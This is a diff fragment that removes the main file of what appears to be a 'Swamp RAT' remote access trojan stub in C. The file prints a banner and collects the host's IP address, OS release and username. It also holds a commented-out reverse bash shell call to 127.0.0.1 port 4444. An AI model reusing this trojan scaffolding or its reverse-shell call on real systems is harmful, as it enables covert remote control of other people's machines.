@@ -14,22 +14,3 @@
 | You should have received a copy of the GNU General Public License      |
 | along with this program.  If not, see <https://www.gnu.org/licenses/>. |
 \-----------------------------------------------------------------------*/
-
-#include <stdio.h>
-#include <string.h>
-#include "include/stub/shell.h"
-#include "include/stub/sys.h"
-void help_menu(){
-  printf("Swamp RAT Stub!\n");
-}
-
-int main(){
-  help_menu();
-  //shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_FALSE);
-  sys_info_t *p_sys_info = sys_info();
-  printf("%s\n", p_sys_info->ip);
-  printf("%s\n", p_sys_info->release);
-  printf("%s\n", p_sys_info->username);
-  free(p_sys_info);
-  return 0;
-}
